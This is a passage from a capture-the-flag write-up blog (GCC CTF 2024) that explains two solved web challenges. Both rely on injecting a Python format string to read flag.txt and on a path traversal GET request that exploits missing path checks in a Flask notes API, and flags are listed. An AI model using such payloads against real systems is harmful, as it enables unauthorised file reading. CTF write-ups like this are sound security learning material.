{&quot;reminder_content&quot;:&quot;{self.coordinates}&quot;}
</code></pre><p>The return value will be <code>&quot;&lt;p&gt;&lt;strong&gt;Cylabus&lt;/strong&gt;: {self.coordinates}&lt;/p&gt;&quot;.format(self=self)</code>. The <code>self.coordinates</code> will be evaluated which results in reading flag.txt. The flag will be displayed when accessing <code>/panel</code></p>
<p><em><strong>FLAG: <code>GCC{iThink_we_Sh0ul_sT1cK_t0_Jinj4_and_4v0id_w3ak_KEYS!}</code></strong></em>
<br/></p>
<h2 id="frenzy-flask">frenzy flask</h2>
<p><code>Missing path checking on GET request to retrieve uploaded file causes Local File Inclusion (LFI)</code></p>
<h3 id="the-problem-3">The Problem</h3>
<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/flask-frenzy.zip">zip file</a> was given.
<br/></p>
<p>There is path checking function in shared.py.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_path</span>(path: str):
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> path

</code></pre></div><p>However, this path checking function is only called when uploading a file (POST). The absence of path checking when getting a file can be exploited to retrieve the flag via path traversal.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@bp_api</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/notes/&lt;path:sessid&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_notes</span>(sessid):
    session_dir <span style="color:#f92672">=</span> abort_check_session(sessid)

    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
        <span style="color:#66d9ef">for</span> uploaded_file <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>files:
            abort_check_path(uploaded_file)

            upload_path <span style="color:#f92672">=</span> session_dir<span style="color:#f92672">.</span>joinpath(uploaded_file)
            <span style="color:#66d9ef">try</span>:
                request<span style="color:#f92672">.</span>files[uploaded_file]<span style="color:#f92672">.</span>save(upload_path)
            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
                abort(<span style="color:#ae81ff">500</span>)


    files_list <span style="color:#f92672">=</span> [str(p<span style="color:#f92672">.</span>name) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> session_dir<span style="color:#f92672">.</span>glob(<span style="color:#e6db74">&#34;*&#34;</span>)]
    <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>jsonify(files_list)

</code></pre></div><h3 id="the-solution-3">The Solution</h3>
<pre tabindex="0"><code>GET /api/notes/f900db07-da3c-491f-b35c-f1f9a3645f0f/../../../../home/user/flag.txt HTTP/1.1
</code></pre><p><em><strong>FLAG: <code>GCC{7h3_p47h_7r4v3r541_7r1ck_3v3n_w0rk5_1n_Ru57-e5e1248d41965126a6caea7b4ddd460cd8c5443a}</code></strong></em>
<br/></p>
<h1 id="social-media">Social Media</h1>
<p>Thanks for reading! Follow me on <a href="https://twitter.com/BerlianGM"><strong>Twitter</strong></a> and <a href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"><strong>LinkedIn</strong></a></p>
</section>

  
  

  
  
  
  
  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
    
    
    <a
      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
      href="https://berliangabriel.github.io/post/bi0s-ctf-2024/"
      ><span>bi0s CTF 2024 Write-up</span><span class="ml-1.5">→</span></a
    >
    
  </nav>
  
  

  
  

  
  

  
  
</article>


    </main>

    <footer
  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
>
  <div class="mr-auto">
    &copy; 2024
    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
  </div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >Powered by Hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >✎ Paper</a
  >
</footer>

  </body>
</html>
